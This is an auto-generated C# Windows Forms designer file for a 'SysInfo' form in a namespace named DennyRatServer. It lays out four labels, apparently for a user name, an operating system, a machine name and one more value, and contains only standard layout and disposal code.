namespace DennyRatServer
{
    partial class SysInfo
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.UserName = new System.Windows.Forms.Label();
            this.LabelOS = new System.Windows.Forms.Label();
            this.MachineTxt = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // UserName
            // 
            this.UserName.AutoSize = true;
            this.UserName.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.UserName.Location = new System.Drawing.Point(12, 9);
            this.UserName.Name = "UserName";
            this.UserName.Size = new System.Drawing.Size(53, 37);
            this.UserName.TabIndex = 0;
            this.UserName.Text = "un";
            // 
            // LabelOS
            // 
            this.LabelOS.AutoSize = true;
            this.LabelOS.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LabelOS.Location = new System.Drawing.Point(12, 63);
            this.LabelOS.Name = "LabelOS";
            this.LabelOS.Size = new System.Drawing.Size(102, 37);
            this.LabelOS.TabIndex = 1;
            this.LabelOS.Text = "label2";
            // 
            // MachineTxt
            // 
            this.MachineTxt.AutoSize = true;
            this.MachineTxt.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.MachineTxt.Location = new System.Drawing.Point(12, 117);
            this.MachineTxt.Name = "MachineTxt";
            this.MachineTxt.Size = new System.Drawing.Size(102, 37);
            this.MachineTxt.TabIndex = 2;
            this.MachineTxt.Text = "label3";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.Location = new System.Drawing.Point(12, 171);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(102, 37);
            this.label8.TabIndex = 3;
            this.label8.Text = "label4";
            // 
            // SysInfo
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(822, 223);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.MachineTxt);
            this.Controls.Add(this.LabelOS);
            this.Controls.Add(this.UserName);
            this.Name = "SysInfo";
            this.Text = "SysInfo";
            this.Load += new System.EventHandler(this.SysInfo_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label UserName;
        private System.Windows.Forms.Label LabelOS;
        private System.Windows.Forms.Label MachineTxt;
        private System.Windows.Forms.Label label8;
    }
}